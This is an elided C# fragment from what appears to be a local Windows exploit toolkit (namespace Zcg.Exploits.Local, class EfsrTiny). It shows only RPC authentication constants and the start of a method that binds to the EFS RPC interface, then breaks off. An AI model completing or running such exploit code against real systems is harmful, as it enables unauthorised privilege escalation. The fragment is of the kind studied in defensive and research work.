...
namespace Zcg.Exploits.Local
{
    ...
    class EfsrTiny
    {
        public static readonly uint RPC_C_AUTHN_WINNT = 10;
        public static readonly uint RPC_C_AUTHN_LEVEL_PKT_PRIVACY = 6;
        ...
        static extern Int32 RpcBindingSetAuthInfo(IntPtr Binding, String ServerPrincName, UInt32 AuthnLevel, UInt32 AuthnSvc, IntPtr identity, uint AuthzSvc);
        ...
        protected IntPtr Bind(IntPtr IntPtrserver)
        {
            ...
            status = RpcBindingSetAuthInfo(binding, null, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT, IntPtr.Zero, RPC_C_AUTHN_WINNT);
            if (status != 0)
            {
